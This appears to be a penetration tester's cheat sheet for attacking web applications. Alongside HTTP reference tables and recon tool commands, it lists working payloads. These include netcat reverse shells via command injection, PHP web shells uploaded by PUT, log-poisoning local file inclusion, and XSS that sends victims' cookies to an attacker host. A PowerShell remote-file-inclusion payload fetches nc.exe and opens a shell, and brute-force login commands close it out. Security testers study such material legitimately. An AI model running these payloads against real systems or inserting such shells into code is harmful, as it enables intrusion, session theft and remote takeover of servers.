Web Apps


# HTTP Methods or Verbs

GET         Does not have a body and passes all parameters in the URL
POST        Send data to a server. Passes all parameters in the body of the request
PUT         Used for adding content to a web app, common with RESTful APIs
DELETE      Used for deleting content from a web app, common with RESTful APIs
HEAD        The web app will only return the response headers, not the body
OPTIONS     Show a list of HTTP options that the server supports
CONNECT     Set up a tunnel between a client and a server for SSL encryption or an HTTP proxy
TRACE       Used for debugging
------------------------------------------------------------------------------------------------------------------------------------------------------

# HTTP Response Codes

100         Continue
200         OK
301         Moved Permanently
302         Found
304         Not Modified
400         Bad Request
401         Unauthorized
403         Forbidden
404         Not Found
500         Internal Server Error
------------------------------------------------------------------------------------------------------------------------------------------------------

# Browser Redirection

<iframe SRC="http://<attacker IP>/report" height = "0" width ="0">
hacker:  use Metasploit browser autopwn
------------------------------------------------------------------------------------------------------------------------------------------------------

# Cisco Router

x is between 15 and 99.
https://target IP/level/x/exec/-/show
------------------------------------------------------------------------------------------------------------------------------------------------------

# ColdFusion

/CFIDE/administrator/ 
/CFIDE/debug/cf_debugFr.cfm
/CFIDE/debug/cf_debugFr.cfm?userPage=../../etc/hosts
/debug/cf_debugFr.cfm
------------------------------------------------------------------------------------------------------------------------------------------------------

# Command Injection

http://target IP/test.php?cmd=whoami
http://target IP/test.php?cmd=nc -e /bin/sh <attacker IP> 443

- PHP command injection from a GET request
<?php echo system($_GET["cmd"]);?>
------------------------------------------------------------------------------------------------------------------------------------------------------

# Cookie Security Issues - missing HttpOnly or Secure attribute

HttpOnly - prevents JavaScript from accessing the cookie
Secure - only send over an encrypted channel
------------------------------------------------------------------------------------------------------------------------------------------------------

# Cookie Stealing

<script>alert(document.cookie)</script>

<script>new Image().src="http://<attacker IP>/test.php?"+ document.cookie;</script>
hacker: nc -lvp 80
------------------------------------------------------------------------------------------------------------------------------------------------------

# DOM

Document object model

Page Source - pre DOM
View Selection Source - post DOM
Inspector - post DOM
------------------------------------------------------------------------------------------------------------------------------------------------------

# File or PUT Upload Vuln

Create a PHP file called shell.php

<?php
$cmd=$_GET["cmd"];
$decode=base64_decode($cmd);
os.system($decode);
?>

curl -ikL -T shell.php http://<target IP>/shell.php
Once the file has been uploaded, pass base64 encoded commands to it to get basic code execution

- Method 2
curl -ikL -X PUT -d '<?php system($_GET["c"]);?>' http://<target IP>/shell.php

wget -O output -o /dev/null www.target.com/evil.php?cmd=$(echo id|base64)
wget -O output -o /dev/null www.target.com/evil.php?cmd=$(echo ifconfig|base64)
------------------------------------------------------------------------------------------------------------------------------------------------------

# Fuzzing

When fuzzing headers, disable URL Encode.
When you are inside of a POST parameter, always use URL encoding.
------------------------------------------------------------------------------------------------------------------------------------------------------

# Headers, Apache version, eTag, HTTP Basic Authentication Enabled

nc <target IP> 80
HEAD / HTTP/1.0
(hit enter 2x)

curl -iksX HEAD <target IP>

for i in `cat 80.txt` ; do curl -iksX HEAD http://$i/ > $i 2>&1 ; echo Scanned $i ; done
------------------------------------------------------------------------------------------------------------------------------------------------------

# HTTP methods allowed

nc <target IP> 80
OPTIONS / HTTP/1.0
(hit enter 2x)

curl -ikLsX OPTIONS <target IP>
------------------------------------------------------------------------------------------------------------------------------------------------------

# iframe

<iframe src="http://<attacker IP>" width="1" height="1"></iframe>
------------------------------------------------------------------------------------------------------------------------------------------------------

# Local file inclusion

http://<target IP>/test.php?page=/etc/passwd

- method 2
nc <target IP> 80
GET /<?php passthru($_GET['cmd']); ?> HTTP/1.1
Host: <target IP>
Connection: close

Send as cmd payload via http://<target IP>/index.php?page=../../../../../var/log/apache2/access.log&cmd=id
------------------------------------------------------------------------------------------------------------------------------------------------------

# PHP version

nc <target IP> 80
GET / HEAD/1.0

http://<target IP>/aaaaa.php

Firefox > Web Developer Toolbar > Information > View Response Headers
------------------------------------------------------------------------------------------------------------------------------------------------------

# Remote Code Execution

<?php system("nc 192.168.1.5 443 -e /bin/bash")?>
------------------------------------------------------------------------------------------------------------------------------------------------------

# Remote File Inclusion

http://<target IP>/test.php?page=http://<attacker IP>/evil.txt

- method 2
<?php system("powershell -Command \"& {(New-Object System.Net.WebClient).DownloadFile('http://<attacker IP>/netcat/nc.exe','nc.exe'); cmd /c nc.exe <attacker IP> 443 -e cmd.exe\" }"); ?>
------------------------------------------------------------------------------------------------------------------------------------------------------

# URL Encoding

%20       space
%40   @   at
%26   &   ampersand
%28   (   open parenthesis
%29   )   close parenthesis
%3B   ;   semicolon
%22   "   double quote
%27   '   single quote
%3C   <   less than
%3E   >   greater than
%2E   .   period
%2F   /   forward slash

Example: <script>alert(document.cookie);</script>
Encoded: %3Cscript%3Ealert%28document%2Ecookie%29%3B%3C%2Fscript%3E
------------------------------------------------------------------------------------------------------------------------------------------------------

# WebDAV extensions are enabled

msfconsole
use auxiliary/scanner/http/webdav_scanner

./davtest.pl -url http://target-IP

for i in $(cat 80.txt); do cadaver -t $i; done
------------------------------------------------------------------------------------------------------------------------------------------------------

# WordPress

wpscan --url http://target --enumerate p --enumerate t --enumerate u
wpscan --url http://target -U users.txt -P passwords.txt

cd /usr/share/wpscan/
stop_user_enumeration_bypass.rb www.target.com --ids 1-1000
------------------------------------------------------------------------------------------------------------------------------------------------------

# XML Injection

Single quote         foo'
Double quote         foo"
Greater than         foo>
Less than            foo<			
Comment tag          foo<!--
Ampersand            &foo
------------------------------------------------------------------------------------------------------------------------------------------------------

# XSS

Injection into the html on the page in a blog:  <h1>test</h1>
<script>alert(42)</script>
<script>alert(‘XSS’)</script>
Try using an HTML entity:  &lt;script&gt:

Stored - example: guestbook
<script>alert("XSS")</script>
<script>alert(document.cookie)</script>
<iframe SRC="http://<attacker IP>" height="0" width="0"></iframe>
<img src="http://<attacker IP>/doom.png" onload="javascript:alert('red team')"/>
<script>new Image().src="http://attakerIP/test.php?output="+document.cookie;</script>

curl http://target.com/login.php?user=`perl –e 'print "a" x 500'`

# DOM Based XSS      <img src="x" onerror="alert(42)" />
# BeEF               <script> src = "http://<attacker IP>:3000/hook.js"></script>
------------------------------------------------------------------------------------------------------------------------------------------------------

# Additional Guides

http://bughunting.guide/a-gentle-introduction-to-cross-site-scripting-xss/
http://bughunting.guide/discovering-xss-vulnerabilities-with-burp-intruder/
https://nvisium.com/blog/2014/01/31/accurate-xss-detection-with-burpsuite/
https://forum.bugcrowd.com/t/tutorial-injectx-to-find-xss/790
------------------------------------------------------------------------------------------------------------------------------------------------------

# Example Test

- Recon
ping target.com
whois <IP>
whois target.com
dig target.com

- Enumeration
nmap -Pn -n -T4 --open -p- -A -sC target.com
nmap -Pn -n -T4 --open -sU -A target.com

sslscan https://target.com
sslyze https://target.com

wafw00f https://www.target.com
whatweb https://target.com

- Directory bruteforce
dirb https://target.com -r -z 10
gobuster dir -u https://target.com -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 50
gobuster dir -u https://target.com -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 50 -x php

- Configuration
nikto -h https://target.com -port 443 -Format htm --output target.htm

- App specific
davtest -url https://target.com
droopescan scan drupal -u https://target.com
joomscan -u https://target.com
uniscan -u https://www.target.com -qweds
wpscan --url https://target.com --enumerate vp,vt,cb,u,m

- Enumerate app
Wappalyzer is a browser extension that uncovers the technologies used on websites. It detects CMS,
   eCommerce platforms, web servers, JavaScript frameworks, analytics tools and more.

- Burp
Manually craw the app by using Firefox to click on every link on every page.

Burp > Target > Site map > right click on root folder > Engagement tools > Discover content > Config > 
  Target: check Directories only, and disable Recurse subdirectories
Filenames: disable both long names
Discovery Engine: Sensitive
    Disable Copy content from suite site map
    *** must use Burp wordlist, can save setting?

Right click on the very first request >  Send to intruder
Clear
Put your curser right after the / > click Add
Payload Sets > Payload type: Runtime file
Payload Options > Select file: sec lists > Discovery > Web_content > raft-medium-directories
Start attack
sort by Status
    500  Server message
    405  Method not allowed

- User-Agent Switcher
Intruder > clear > select user agent string > Add
Payload Options > Select file: sec lists > Discovery > Web_content > UserAgents.fuzz.txt
Sort by Length > Response > Render

- Automated Discovery
Target > Site map > select root folder > Actively scan this host > ??? > sort by URL
Manually remove duplicates

- Test for account lockout
Payload: Null payload : Generate 100 payloads.

- Brute force ia Basic authentication login
Cluster bomb - multiple usernames/passwords using all combinations.
    username - simple list
    passwords - runtime file
    Look for a Status of 3xx then sort by Length.

hydra -L users.txt -P pass.txt <target IP> http-get

Metasploit
    use auxiliary/scanner/http/http_login
    set user_file user.txt
    set pass_file pass.txt
    set rhosts <target IP>
    set stop_on_success true
    exploit

